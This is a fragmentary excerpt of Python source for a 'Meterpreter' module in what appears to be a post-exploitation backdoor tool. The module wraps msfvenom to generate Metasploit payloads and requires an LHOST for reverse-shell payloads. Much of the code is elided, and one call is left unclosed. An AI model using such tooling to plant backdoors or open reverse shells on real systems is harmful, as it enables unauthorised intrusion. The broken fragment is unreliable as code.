...
class Meterpreter(Module):
    ...
    def init(self):
        ...
        self.register_arguments([
            {
                'name': '-msfvenom-path',
                'help': 'Msvenom command',
                'default': 'msfvenom'
            },
            {
                'name': '-payload',
                'help': 'Msfconsole command',
    ...
    def run(self):
        ...
        if not msvenom_path:
            log.error(messages.module_backdoor_metasploit.msfvenom_s_not_found
        ...
        if 'reverse' in self.args['payload']:
            ...
            if not lhost:
                log.error(
                    messages.module_backdoor_metasploit.
                    error_payload_s_requires_lhost % self.args['payload'])
                return
            else:
                options += [('LHOST', lhost)]
        ...
        try:
            subprocess.check_call(
                arguments_list, stderr=open('/dev/null', 'w'))
